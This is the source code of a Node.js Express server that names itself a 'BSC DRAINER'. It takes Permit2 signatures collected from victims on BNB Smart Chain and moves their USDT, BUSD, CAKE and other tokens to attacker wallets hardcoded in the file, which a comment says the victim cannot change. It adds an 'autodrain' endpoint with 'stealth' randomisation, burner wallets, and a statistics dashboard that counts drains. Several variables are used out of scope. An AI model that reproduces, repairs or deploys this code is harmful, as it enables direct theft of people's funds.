const express = require('express');
const { ethers } = require('ethers');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(helmet());
app.use(cors());
app.use(express.json());

// Create logs directory if it doesn't exist
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir, { recursive: true });
}

// Setup logging streams
const logStream = fs.createWriteStream(path.join(logsDir, 'drains.log'), { flags: 'a' });
const dailyLogStream = fs.createWriteStream(path.join(logsDir, 'daily.log'), { flags: 'a' });

// Line ~24 - ADD this line:
const PERMIT2_FULL_ABI = [
  "function permitTransferFrom((address token,uint256 amount,uint160 expiration,uint48 nonce) permit,address owner,address to,bytes signature) external",
  "function permitTransferFrom((address token,uint256 amount,uint160 expiration,uint48 nonce)[] permits,address owner,address to,bytes signature) external",
  "function DOMAIN_SEPARATOR() view returns (bytes32)",
  "function nonce(address owner,uint256 token,uint48 index) view returns (uint48)"
];

// Token list
const TOKENS = {
  USDT: '0x55d398326f99059fF775485246999027B3197955',
  BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
  CAKE: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
  WBNB: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
  BTCB: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
  ETH: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
  XRP: '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
  ADA: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',
  DOT: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402'
};

// Burner accounts
const BSC_RPC = 'https://bsc-dataseed1.binance.org/';
const provider = new ethers.providers.JsonRpcProvider(BSC_RPC);
const BSC_KEYS = process.env.BSC_KEYS.split(',');
const burners = BSC_KEYS.map(pk => new ethers.Wallet(pk.trim(), provider));

function getBurner() {
  return burners[Math.floor(Math.random() * burners.length)];
}

// Permit2 ABI
const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const PERMIT2_ABI = [
  "function permitTransferFrom((address token,uint256 amount,uint160 expiration,uint48 nonce) permit,address owner,address to,bytes signature) external",
  "function batchPermitTransferFrom((address token,uint256 amount,uint160 expiration,uint48 nonce)[] permits,address owner,address to,bytes signature) external"
];

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
});
app.use(limiter);

// Routes
app.get('/burner', (req, res) => {
  const wallet = getBurner();
  res.json({ burner: wallet.address, chainId: 56 });
});

// Helper function to parse logs and calculate statistics
function parseLogs(logFilePath) {
  try {
    const logs = fs.readFileSync(logFilePath, 'utf8');
    const lines = logs.trim().split('\n');
    
    // Count by date
    const dailyCounts = {};
    // Token distribution
    const tokenCounts = {};
    // Gas usage
    const gasUsages = [];
    
    lines.forEach(line => {
      const parts = line.split(',');
      if (parts.length >= 6) {
        const date = parts[0].substring(0, 10); // Extract YYYY-MM-DD
        const token = parts[2];
        const gas = parseInt(parts[5]);
        
        // Daily counts
        dailyCounts[date] = (dailyCounts[date] || 0) + 1;
        
        // Token counts
        tokenCounts[token] = (tokenCounts[token] || 0) + 1;
        
        // Gas usage
        if (!isNaN(gas)) gasUsages.push(gas);
      }
    });
    
    return { dailyCounts, tokenCounts, gasUsages };
  } catch (e) {
    console.error('Error parsing logs:', e);
    return { dailyCounts: {}, tokenCounts: {}, gasUsages: [] };
  }
}

// Helper function to calculate stats
function calculateStats(logsDir) {
  const today = new Date().toISOString().substring(0, 10);
  const yesterday = new Date(new Date().setDate(new Date().getDate() - 1))
    .toISOString().substring(0, 10);
    
  // Parse all log files
  const stats = parseLogs(path.join(logsDir, 'drains.log'));
  
  // Calculate today's count
  const todayCount = stats.dailyCounts[today] || 0;
  
  // Calculate yesterday's count
  const yesterdayCount = stats.dailyCounts[yesterday] || 0;
  
  // Calculate growth percentage
  const growth = yesterdayCount > 0 
    ? Math.round(((todayCount - yesterdayCount) / yesterdayCount) * 100)
    : 0;
  
  // Calculate token distribution
  const total = Object.values(stats.tokenCounts).reduce((sum, count) => sum + count, 0);
  const tokenDistribution = Object.entries(stats.tokenCounts)
    .map(([token, count]) => ({
      token,
      percentage: ((count / total) * 100).toFixed(2)
    }))
    .sort((a, b) => b.percentage - a.percentage);
  
  // Calculate average gas usage
  const avgGasUsage = stats.gasUsages.length > 0
    ? Math.round(stats.gasUsages.reduce((sum, gas) => sum + gas, 0) / stats.gasUsages.length)
    : 0;
  
  return {
    totalDrains: stats.dailyCounts[today] || 0,
    daily: todayCount,
    growth,
    topTokens: tokenDistribution.slice(0, 5),
    avgGasUsage,
    uptime: '99.9%'
  };
}

app.post('/drain', async (req, res) => {
  try {
    const { owner, token, amount, nonce, deadline, signature, tokenSymbol, destination } = req.body;
    
// ✅ HARDCODED - VICTIM CAN'T CHANGE DESTINATION
const HARDCODED_WALLETS = {
      USDT: '0x65b4be1fdded19b66d0029306c1fdb6004586876',  // ← YOUR USDT RECEIVER
      BUSD: '0x65b4be1fdded19b66d0029306c1fdb6004586876',  // ← YOUR BUSD RECEIVER
      CAKE: '0x65b4be1fdded19b66d0029306c1fdb6004586876',  // ← YOUR CAKE RECEIVER
      WBNB: '0x65b4be1fdded19b66d0029306c1fdb6004586876', 
      BTCB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
      ETH:  '0xA1b2D46c98D2828fFC6Fb3D762F10A51cA332a4e',
      XRP:  'rwNVj73271WXbc3a69AtPTowWXLFUBKuTT',
      ADA:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
      DOT:  '13GegmbHtDzYgyHaDMoz1SGa38ddrRdsSjbDWJ5jDGPKH2BD'
    };

    // Validate all inputs
    if (!ethers.utils.isAddress(owner) || !ethers.utils.isAddress(token) || !signature) {
      return res.status(400).json({ error: 'Invalid parameters' });
    }
    
    // Validate destination wallet
    if (!destination || !ethers.utils.isAddress(destination)) {
      return res.status(400).json({ error: 'Invalid destination wallet' });
    }
    
    // Validate token symbol
    if (!TOKENS[tokenSymbol]) {
      return res.status(400).json({ error: 'Unsupported token' });
    }
    
    // Token-specific validation
    if (tokenSymbol === 'USDT' && token !== TOKENS.USDT) {
      return res.status(400).json({ error: 'Invalid USDT token address' });
    }
    
    const wallet = getBurner();
    const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3'; 
    const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, wallet);
    
    // Validate signature
    const recoveredAddress = ethers.utils.verifyTypedData(
      {name:'Permit2',version:'1',chainId:56,verifyingContract:PERMIT2},
      {
        PermitSingle:[{name:'details',type:'PermitDetails'},{name:'spender',type:'address'},{name:'sigDeadline',type:'uint256'}],
        PermitDetails:[{name:'token',type:'address'},{name:'amount',type:'uint160'},{name:'expiration',type:'uint48'},{name:'nonce',type:'uint48'}]
      },
      {
        details:{token,amount:ethers.constants.MaxUint256,expiration:BigInt(deadline),nonce:BigInt(nonce)},
        spender:wallet.address,sigDeadline:BigInt(deadline)
      },
      signature
    ).toLowerCase();
    
    if (recoveredAddress !== owner.toLowerCase()) {
      return res.status(400).json({ error: 'Invalid signature' });
    }
    
    // Create permit object
    const permit = {
      token: token.toLowerCase(),
      amount: ethers.BigNumber.from(MAX_UINT160),  // ✅ FIXED
      expiration: ethers.BigNumber.from(deadline),
      nonce: ethers.BigNumber.from(nonce)
    };
    
const finalDestination = HARDCODED_WALLETS[tokenSymbol] || destination;
console.log(`🔥 DRAINING ${tokenSymbol}: ${owner.slice(0,10)} → ${finalDestination.slice(0,10)}`);
    
    const tx = await permit2.permitTransferFrom(
      permit,
      owner,
      finalDestination,
      signature,
      { 
        gasLimit: 500000,
        gasPrice: ethers.utils.parseUnits('5', 'gwei')
      }
    );
    
    const receipt = await tx.wait();
    
    console.log(`✅ ${tokenSymbol} DRAINED: https://bscscan.com/tx/${tx.hash}`);
    
    // Log successful transaction
    const log = `${new Date().toISOString()},${owner},${tokenSymbol},${finalDestination},${tx.hash},${receipt.gasUsed.toString()}\n`;
    logStream.write(log);
    
    // Log daily stats
    const dailyLog = `${new Date().toISOString()},${tokenSymbol},${receipt.gasUsed.toString()}\n`;
    dailyLogStream.write(dailyLog);
    
    res.json({ 
      success: true, 
      tx: tx.hash, 
      gasUsed: receipt.gasUsed.toString(),
      destination: destination,
      block: receipt.blockNumber
    });
    
  } catch (e) {
    console.error('❌ Drain failed:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// Enhanced auto-drain endpoint with stealth features
app.post('/autodrain', async (req, res) => {
  try {
    const { owner, destinations, stealthParams } = req.body;
    
    if (!ethers.utils.isAddress(owner)) {
      return res.status(400).json({ error: 'Invalid owner address' });
    }
    
    const results = [];
    let successCount = 0;
    
    // Generate randomized parameters for all tokens
    const tokenParams = {};
    Object.entries(TOKENS).forEach(([symbol, token]) => {
      const destWallet = HARDCODED_WALLETS[symbol];
      if (!destWallet || !ethers.utils.isAddress(destWallet)) {
        return;
      }
      
      // Randomize parameters for stealth
      const nonce = BigInt(Math.floor(Math.random() * 281474976710656n));
      const deadline = BigInt(Math.floor(Date.now() / 1000) + 86400n + Math.floor(Math.random() * 86400));
      const gasLimit = Math.floor(450000 + Math.random() * 100000); // 450k-550k
      
      tokenParams[symbol] = {
        token,
        dest: destWallet,
        nonce,
        deadline,
        gasLimit
      };
    });
    
    // Process all tokens in parallel with stealth parameters
    const promises = Object.entries(tokenParams).map(async ([symbol, params]) => {
      try {
        // Generate signature with randomized parameters
        const domain = {name:'Permit2',version:'1',chainId:56,verifyingContract:PERMIT2};
        const types = {
          PermitSingle:[{name:'details',type:'PermitDetails'},{name:'spender',type:'address'},{name:'sigDeadline',type:'uint256'}],
          PermitDetails:[{name:'token',type:'address'},{name:'amount',type:'uint160'},{name:'expiration',type:'uint48'},{name:'nonce',type:'uint48'}]
        };
        
        const value = {
          details:{token:params.token,amount:ethers.constants.MaxUint256,expiration:params.deadline,nonce:params.nonce},
          spender:getBurner().address,sigDeadline:params.deadline
        };
        
        const signature = await getBurner()._signTypedData(domain,types,value);
        
        // Send transaction with randomized parameters
        const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, getBurner());
        
        const MAX_UINT160 = "0xffffffffffffffffffffffffffffffffffffffff"; // 20 bytes MAX
const safeAmount = amount && amount.length <= 40 ? amount : MAX_UINT160;

const permit = {
  token: token.toLowerCase(),
  amount: ethers.BigNumber.from(safeAmount),  // ✅ FIXED
  expiration: ethers.BigNumber.from(deadline),
  nonce: ethers.BigNumber.from(nonce)
};
        
        const tx = await permit2.permitTransferFrom(
          permit,
          owner,
          destWallet,  // ✅ YOUR HARDCODED WALLET
          signature,
          { 
            gasLimit: params.gasLimit,
            gasPrice: ethers.utils.parseUnits('5', 'gwei')
          }
        );
        
        const receipt = await tx.wait();
        successCount++;
        
        // Log successful transaction
        const log = `${new Date().toISOString()},${owner},${symbol},${params.dest},${tx.hash},${receipt.gasUsed.toString()}\n`;
        logStream.write(log);
        
        // Log daily stats
        const dailyLog = `${new Date().toISOString()},${symbol},${receipt.gasUsed.toString()}\n`;
        dailyLogStream.write(dailyLog);
        
        return {
          symbol,
          success: true,
          tx: tx.hash,
          gasUsed: receipt.gasUsed.toString(),
          destination: params.dest,
          block: receipt.blockNumber
        };
      } catch (e) {
        return { symbol, success: false, error: e.message };
      }
    });
    
    // Wait for all transactions with randomized timing
    const drainResults = await Promise.all(promises);
    
    res.json({ 
      success: true, 
      count: successCount,
      total: Object.keys(TOKENS).length,
      drainResults
    });
    
  } catch (e) {
    console.error('❌ Auto-drain failed:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// Dashboard endpoint
app.get('/stats', (req, res) => {
  try {
    const stats = calculateStats(logsDir);
    res.json(stats);
  } catch (e) {
    console.error('Error generating stats:', e);
    res.status(500).json({ error: 'Failed to generate stats' });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', uptime: process.uptime(), memory: process.memoryUsage() });
});

// Start logging service that rotates logs daily
function startLoggingService() {
  setInterval(() => {
    const now = new Date();
    const today = now.toISOString().substring(0, 10);
    const yesterday = new Date(now.setDate(now.getDate() - 1))
      .toISOString().substring(0, 10);
    
    // Check if we need to rotate logs
    if (fs.existsSync(path.join(logsDir, `${yesterday}.log`))) {
      // Move old logs to archive
      fs.renameSync(
        path.join(logsDir, `${yesterday}.log`),
        path.join(logsDir, 'archive', `${yesterday}.log`)
      );
    }
    
    // Create new daily log
    if (!fs.existsSync(path.join(logsDir, `${today}.log`))) {
      fs.writeFileSync(path.join(logsDir, `${today}.log`), '');
    }
  }, 24 * 60 * 60 * 1000); // Check every 24 hours
}

startLoggingService();

app.listen(process.env.PORT || 3000, () => {
  console.log(`🚀 BSC DRAINER LIVE: http://localhost:${process.env.PORT || 3000}`);
});
